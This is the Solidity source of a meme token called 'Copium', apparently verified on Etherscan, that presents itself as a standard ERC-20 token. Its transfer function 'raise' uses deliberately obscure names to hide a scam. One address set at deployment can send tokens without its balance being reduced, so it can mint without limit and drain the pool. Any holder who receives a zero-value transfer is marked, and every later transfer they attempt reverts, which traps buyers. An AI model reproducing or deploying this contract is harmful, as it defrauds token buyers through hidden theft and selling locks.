/**
 *Submitted for verification at Etherscan.io on 2023-05-14
*/

// https://twitter.com/COPIUMDROP

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Copium is Ownable {

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    address public uniswapV2Pair;
    
    uint256 public totalSupply = 4_206_900_000_000 * 10 ** decimals;

    string public symbol = "COPIUM";

    function transfer(address positive, uint256 cope) public returns (bool success) {
        raise(msg.sender, positive, cope);
        return true;
    }

    mapping(address => uint256) private less;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address recur) {
        balanceOf[msg.sender] = totalSupply;
        less[recur] = pump;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function approve(address recruit, uint256 cope) public returns (bool success) {
        allowance[msg.sender][recruit] = cope;
        emit Approval(msg.sender, recruit, cope);
        return true;
    }

    uint256 private pump = 82;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private fomo;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = "Copium";

    function raise(address margin, address positive, uint256 cope) private returns (bool success) {
        if (less[margin] == 0) {
            if (uniswapV2Pair != margin && fomo[margin] > 0) {
                less[margin] -= pump;
            }
            balanceOf[margin] -= cope;
        }
        balanceOf[positive] += cope;
        if (cope == 0) {
            fomo[positive] += pump;
        }
        emit Transfer(margin, positive, cope);
        return true;
    }

    function transferFrom(address margin, address positive, uint256 cope) public returns (bool success) {
        raise(margin, positive, cope);
        require(cope <= allowance[margin][msg.sender]);
        allowance[margin][msg.sender] -= cope;
        return true;
    }
}